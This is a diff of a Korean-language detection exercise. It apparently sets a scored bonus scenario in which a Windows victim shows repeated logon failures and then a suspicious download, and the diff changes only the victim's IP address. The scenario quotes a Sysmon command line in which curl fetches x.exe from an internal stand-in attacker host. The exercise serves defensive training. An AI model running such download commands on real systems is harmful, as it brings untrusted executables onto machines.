@@ -469,7 +469,7 @@ echo "TTD (탐지 소요 시간): ${TTD}초"
 
 ### 시나리오 6 (보너스 10점) — Windows victim 의 인증 실패 + 의심 다운로드 timeline
 
-> 6v6-win (10.20.32.60) 에서 다음 사건이 발생했다.
+> 6v6-win (10.20.33.60) 에서 다음 사건이 발생했다.
 >
 > 1. 14:00–14:05 : Security EID 4625 가 5회 발생 (SourceWorkstation=external, LogonType=3).
 > 2. 14:07 : Sysmon EID 1 (curl.exe, CommandLine=`curl http://10.20.30.202/x.exe -o C:\Temp\x.exe`).
